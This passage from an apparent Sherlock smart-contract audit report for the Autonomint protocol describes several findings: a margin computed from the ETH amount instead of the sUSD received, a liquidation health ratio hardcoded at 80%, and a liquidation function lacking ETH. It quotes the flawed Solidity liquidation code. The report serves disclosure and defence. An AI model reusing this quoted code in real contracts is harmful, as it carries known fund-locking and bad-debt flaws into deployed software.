The problem is that, the [`margin`](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L357-L359) is suppose to be evaluated using the `sUSD` amount not the value of the amount of the original ETH asset.

### Root Cause

_No response_

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

This can lead to unpredictable results during the liquidation including a DOS since the evaluated margin may be more that the actual amount od `sUSD` exchanged previously

### PoC

_No response_

### Mitigation

Consider using the amount of `sUSD` received after exchanging sETH to `sUSD`

# Issue M-37: Health ratio is hardcoded causing issues once the LTV is updated 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/1031 

## Found by 
John44

### Summary

The current LTV of the protocol is 80% and is intended to increase as much as possible once the protocol matures (as stated in the docs). The issue is that the health ratio of borrow positions is hardcoded in several places causing issues once the LTV is actually updated.

### Root Cause

In BorrowLib and in borrowLiquidation the health ratio of a position is hardcoded to 8000 = 80%. This is because the initial LTV of a deposit will be 80%. The health ratio is used to make sure that a withdrawer cannot withdraw their collateral if they are eligible for liquidation and more importantly to determine whether a borrower can be liquidated. The issue is that the LTV is intended to grow, therefore if the LTV grows for example to 90%, a hardcoded health ratio of only 80% will be insufficient.

https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L501
https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L822
https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L191
https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L336

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. After some time the LTV is increased to 90%, thus the debt of borrowers will be worth 90% of their collateral.
2. However, as the health ratio is hardcoded to 80%, the only way for a borrower to be liquidated is if their collateral decreases it's value by 20%, instead of 10%.
3. Therefore, debt positions will always be heavily insolvent before they can be liquidated, increasing the risks of bad debt accruing to the protocol.

### Impact

Once the LTV is increased, the health ratio will remain the same, causing debt positions to not be liquidatable even when they are insolvent, accruing bad debt to the protocol.

### PoC

_No response_

### Mitigation

The health ratio should be modifiable in order to account for the increasing LTV.

# Issue M-38: `liquidationType2` will self DOS due to lack of ETH 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/1056 

## Found by 
0x23r0, 0x37, DenTonylifer, Galturok, John44, LordAlive, ParthMandale, futureHack, nuthan2x, santiellena, valuevalk

### Summary


ETH is not pulled from the treasury to turn into sUSD. 
Although it's in a payable function, the ETH is inside the treasury contract and admin doesn't have access directly to take ETH out and send via `msg.value`, it has to be pulled internally from treasury when calling liquidation


### Root Cause


lack of ETH movement from treasury into borrowLiquidation contract. So, [borrowLiquidation.liquidationType2](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L340-L354) will fail.



### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path


When liquidating type 2, the Eth in value is turned into WETH, and then ot is turned into sETH from synthetix.
Then the sETH is turned into sUSD and this amount is used to liquidate.

But the issue is `liquidationType2` on `BorrowLiqudiation` contract lacks the ETH in it. Although its in a payable function, the ETH is inside the treasury contract and admin doesn't have access directly to take ETH out and send via `msg.value`, it has to be pulled from treasury and continue the steps to swap into `sUSD`.

[borrowLiquidation.liquidationType2](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L340-L354)
```solidity

    function liquidationType2(
        address user,
        uint64 index,
        uint64 currentEthPrice
    ) internal {

//////////////////////////////////////
/////////////////////////////////////
        uint256 amount = BorrowLib.calculateHalfValue(depositDetail.depositedAmountInETH);
        // Convert the ETH into WETH
    @>  weth.deposit{value: amount}();
        // Approve it, to mint sETH
        bool approved = weth.approve(address(wrapper), amount);
        if (!approved) revert BorrowLiq_ApproveFailed();

        // Mint sETH
        wrapper.mint(amount);
        // Exchange sETH with sUSD
        synthetix.exchange(
            0x7345544800000000000000000000000000000000000000000000000000000000,
            amount,
            0x7355534400000000000000000000000000000000000000000000000000000000
        );

        // Calculate the margin
        int256 margin = int256((amount * currentEthPrice) / 100);
        // Transfer the margin to synthetix
        synthetixPerpsV2.transferMargin(margin);

        // Submit an offchain delayed order in synthetix for short position with 1X leverage
        synthetixPerpsV2.submitOffchainDelayedOrder(
            -int((uint(margin * 1 ether * 1e16) / currentEthPrice)),
            currentEthPrice * 1e16
        );
    }
```

### Impact


`liquidationType2` is DOS, broken functionality



### PoC

_No response_

### Mitigation


move ETH from the treasury to BorrowLiquidation

